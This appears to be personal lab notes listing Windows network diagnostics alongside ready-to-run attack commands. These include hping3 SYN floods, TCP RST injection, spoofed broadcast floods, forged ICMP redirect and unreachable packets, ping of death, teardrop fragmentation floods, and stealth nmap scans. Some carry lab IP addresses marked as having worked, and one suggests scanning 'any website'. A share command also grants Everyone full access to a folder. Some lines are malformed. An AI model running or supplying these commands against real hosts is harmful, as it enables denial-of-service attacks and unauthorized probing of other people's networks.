bc.com
ipconfig
tracert ip
netsh wlan show profile
pathping ip
netstat -a
net share ShareName=C:\share /GRANT:Everyone,FULL
net share ShareName /DELETE
route print
arp -a
nslookup ip
................
Syn Flood
    sudo hping3 -s -flood --interface eth0 -p 80 ip
Send TCP RST packets
    sudo hping3 -R -p 80 ip
...............
TCP port scanning
    here IP can be of any website
    TCP  connect scan : nmap -sT ip
    SYN scan : nmap -sS ip
    FIN scan : nmap -sF ip
    Xmas : nmap -sX ip
    NULL scan : nmap -sN ip
.................
UDP port scanning
    sudo nmap -sU --host-timeout 100s nmap.org
    sudo -sU -p 53,123 --data-length 16 --max-retries 1 --host-timeout 30m
--min-rate 1000 nmap.org
    sudo nmap -sU -p 53,123 --max-retries 1 --host-timeout 15m --min-rate 1000
nmap.org

// my own
sudo nmap -sU -F nmap.org , -T4 etc also dont worrry not that much complex -p 123, 44 etc as well

................
ping of death : ping -s 65500 targetIP
spoof attack : sudo hping3 --spoof IP -c 10 -S SPOOF_IP_netmask
//my version of spoof attack: sudo hping3 --spoof myip(target) broadcast(.255.255 at end)
Destination unreachable : sudo hping3 -C 3 -d 120 -p 443 IP
// we can also include:  sudo hping3 -C 3 -d 120 -s 3000 -p 443 172.18.1.168

redirect attack : sudo hping3 -C 5 -d 120 LINUX_IP -p 443 WIN_IP
//this worked: sudo hping3 -C 5 -d 120 -a 172.18.1.173 172.18.1.168

source quench : sudo hping3 -C 4 -d 120 WIN_IP
.............
ip fragmentation : sudo ping -f -l 900 WIN_IP
IP teardrop : sudo hping3 -I eth0 --frag --flood -d 120 -p 80 IP

